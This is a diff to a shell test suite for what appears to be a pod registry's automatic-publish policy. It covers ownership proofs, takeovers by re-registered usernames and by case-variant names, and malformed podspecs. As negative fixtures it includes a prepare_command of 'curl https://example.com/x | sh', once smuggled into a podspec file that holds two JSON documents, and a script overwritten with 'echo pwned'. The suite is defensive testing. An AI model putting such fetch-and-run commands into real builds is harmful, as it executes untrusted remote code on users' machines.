@@ -2,11 +2,11 @@
 # Exercises publish-policy.sh (and the verify-trunk-owner.sh checks it
 # runs) against a disposable local git repository and local stand-ins for
 # everything they read over the network: CocoaPods' CDN as files read over
-# file://, CocoaPods trunk's API, the GitHub API and a pod's website as a
-# local HTTP server, and GitHub-hosted repositories as local bare repos.
-# Covers each kind of pull request that publishes automatically and each
-# one rejected automatically, including the namespace-takeover and
-# case-variant attacks the ownership proofs have to resist.
+# file://, and CocoaPods trunk's API, the GitHub API and a pod's website as
+# a local HTTP server. Covers each kind of pull request that publishes
+# automatically and each one rejected automatically, including the
+# namespace-takeover and case-variant attacks the ownership proofs have
+# to resist.
 #
 # Usage: scripts/test-publish-policy.sh
 # Exits non-zero if any scenario's actual result doesn't match its
@@ -115,9 +115,11 @@ trunk_api() { # <name> <owner emails, comma-separated>
   json "trunk/pods/$1" "{\"owners\": [$owners], \"versions\": [$versions]}"
 }
 
-# OwnedPod moved from oldowner to RealOwner in 1.10.0. Listed out of
-# order, so only a real version sort finds the latest.
+# OwnedPod moved from oldowner to RealOwner in 1.10.0. Its 2.0.0-beta.1,
+# from the old repository, sorts above 1.10.0 as a version but was
+# published earlier, so only trunk's dates find the current repository.
 trunk_pod OwnedPod 1.10.0 2020-06-01 "$(github_source OwnedPod 1.10.0 RealOwner/OwnedPod)"
+trunk_pod OwnedPod 2.0.0-beta.1 2018-06-01 "$(github_source OwnedPod 2.0.0-beta.1 oldowner/OwnedPod)"
 trunk_pod OwnedPod 1.9.0 2019-01-01 "$(github_source OwnedPod 1.9.0 oldowner/OwnedPod)"
 trunk_api OwnedPod real@owner.dev
 # RecycledPod's account was deleted; someone re-registered the username later.
@@ -161,23 +163,27 @@ repo ghostuser/RecycledPod 3002 User 2024-03-02
 repo acme/OrgPod 5000 Organization 2018-01-01
 repo acme/FilePod 5000 Organization 2018-01-01
 json api/orgs/acme/public_members/carol '{}'
-# Commits on acme/OrgPod, each credited by GitHub to an account.
+# Commits, each credited by GitHub to an account. On a renamed-in or
+# re-created repository, commits made with an owner's email are still
+# credited to the owner's account, never to whoever holds the repository.
 json api/repos/acme/OrgPod/commits '[
   {"author": {"login": "grace", "id": 2002}, "commit": {"author": {"email": "grace@pods.dev"}}},
   {"author": {"login": "henry", "id": 2003}, "commit": {"author": {"email": "henry@other.dev"}}}
 ]'
+json api/repos/RealOwner/OwnedPod/commits '[
+  {"author": {"login": "RealOwner", "id": 3001}, "commit": {"author": {"email": "real@owner.dev"}}}
+]'
+json api/repos/oldowner/OwnedPod/commits '[]'
+json api/repos/ghostuser/RecycledPod/commits '[
+  {"author": {"login": "someone", "id": 3999}, "commit": {"author": {"email": "ghost@old.dev"}}}
+]'
 
-# --- GitHub-hosted repositories: acme/FilePod lists dave in .zorvok-owners ---
-GH="$WORK_DIR/gh"
-git init -q -b main "$WORK_DIR/filepod"
-printf '# Zorvok publishers\n4001 dave\n' > "$WORK_DIR/filepod/.zorvok-owners"
-git -C "$WORK_DIR/filepod" add -A
-git -C "$WORK_DIR/filepod" -c user.email=t@e.com -c user.name=T commit -q -m init
-mkdir -p "$GH/acme"
-git clone -q --bare "$WORK_DIR/filepod" "$GH/acme/FilePod.git"
+# A CDN whose pod list came back empty (or cut short).
+mkdir -p "$WORK_DIR/empty-cdn"
+: > "$WORK_DIR/empty-cdn/all_pods.txt"
 
-export TRUNK_CDN_URL="file://$CDN" TRUNK_API_URL="$LOCAL/trunk" GITHUB_API_URL="$LOCAL/api" GITHUB_SERVER_URL="file://$GH"
-export GIT_ALLOW_PROTOCOL=file ZORVOK_FETCH_PROTO="=https,http,file"
+export TRUNK_CDN_URL="file://$CDN" TRUNK_API_URL="$LOCAL/trunk" GITHUB_API_URL="$LOCAL/api"
+export ZORVOK_FETCH_PROTO="=https,http,file" ZORVOK_MIN_TRUNK_PODS=1
 unset GH_TOKEN
 
 # --- base state: ExistingPod 1.0.0, owned by alice (user 1001) ---
@@ -267,17 +273,20 @@ setup_empty_owners()      { printf '# nobody\n' > Specs/ExistingPod/OWNERS; }
 setup_script_edit()       { podspec ExistingPod 2.0.0; echo 'echo pwned' > scripts/validate-pr.sh; }
 setup_owners_only()       { mkdir -p Specs/ClaimedName; printf '9001 mallory\n' > Specs/ClaimedName/OWNERS; }
 setup_prepare_command()   { podspec ExistingPod 2.0.0 ', "prepare_command": "curl https://example.com/x | sh"'; }
+# prepare_command in a first JSON document, followed by a second one that
+# jq would otherwise judge on its own.
+setup_two_documents()     { mkdir -p Specs/ExistingPod/2.0.0; printf '{"name": "ExistingPod", "version": "2.0.0", "prepare_command": "curl https://example.com/x | sh"}\n{}\n' > Specs/ExistingPod/2.0.0/ExistingPod.podspec.json; }
 
 run_case "an owner publishes a new version"                                  publish "1001 alice"     setup_owner_update
 run_case "a new pod whose name isn't on CocoaPods trunk"                     publish "1002 bob"       setup_new_pod
 run_case "a trunk pod, by a trunk owner whose GitHub email is public"        publish "2001 frank"     setup_claim_org_pod
 run_case "a trunk pod, by a trunk owner GitHub credits with commits"         publish "2002 grace"     setup_claim_org_pod
 run_case "a trunk pod, by a committer whose email isn't a trunk owner's"     reject  "2003 henry"     setup_claim_org_pod   "pod trunk register"
-run_case "a trunk pod, by the account that owns its repo (older than it)"    publish "3001 realowner" setup_claim_owned_pod
-run_case "a trunk pod, by its repo's previous owner"                         reject  "3003 oldowner"  setup_claim_owned_pod "file named .zorvok-owners"
-run_case "a trunk pod, by a re-registered username newer than the release"   reject  "3002 ghostuser" setup_claim_recycled  "was created after CocoaPods trunk published RecycledPod 2.0.0"
+run_case "a trunk pod, by its owner credited in its latest version's repo"  publish "3001 realowner" setup_claim_owned_pod
+run_case "a trunk pod, by the owner of a repo it used to point to"       reject  "3003 oldowner"  setup_claim_owned_pod "add it to your GitHub account"
+run_case "a trunk pod, by whoever holds its repo's name now (not proof)"     reject  "3002 ghostuser" setup_claim_recycled  "only its owners there can publish it here"
 run_case "a trunk pod, by a public member of the owning org (not proof)"     reject  "2004 carol"     setup_claim_org_pod   "only its owners there can publish it here"
-run_case "a trunk pod whose repo lists the publisher's ID in .zorvok-owners" publish "4001 dave"      setup_claim_file_pod
+run_case "a trunk pod whose repo lists the publisher in a file (not proof)"  reject  "4001 dave"      setup_claim_file_pod  "pod trunk register"
 run_case "a binary-only trunk pod, by its website's listed owner (not proof)" reject "6001 erin"      setup_claim_site_pod  "pod trunk register"
 run_case "a trunk pod, by someone else"                                      reject  "9001 mallory"   setup_claim_owned_pod "only its owners there can publish it here"
 run_case "a name differing only in case from a trunk pod"                    reject  "9001 mallory"   setup_case_variant_trunk "differs only in letter case from OwnedPod"
@@ -290,8 +299,11 @@ run_case "an owner removes every owner"                                      rej
 run_case "a version plus a change to the registry's own scripts"             reject  "1001 alice"     setup_script_edit     "scripts/validate-pr.sh: a publish can only add podspecs"
 run_case "an OWNERS file with no version (claiming a bare name)"             reject  "9001 mallory"   setup_owners_only     "without a version of ClaimedName"
 run_case "a podspec that uses prepare_command"                               reject  "1001 alice"     setup_prepare_command "uses prepare_command"
+run_case "a podspec file holding two JSON documents"                         reject  "1001 alice"     setup_two_documents   "must be a single JSON object"
 CASE_CDN="file://$WORK_DIR/no-such-cdn"
 run_case "a new pod when CocoaPods trunk can't be reached"                   reject  "1002 bob"       setup_new_pod         "couldn't be reached"
+CASE_CDN="file://$WORK_DIR/empty-cdn"
+run_case "a new pod when trunk's pod list comes back empty"                  reject  "1002 bob"       setup_new_pod         "couldn't be reached"
 
 echo
 echo "$pass passed, $fail failed"
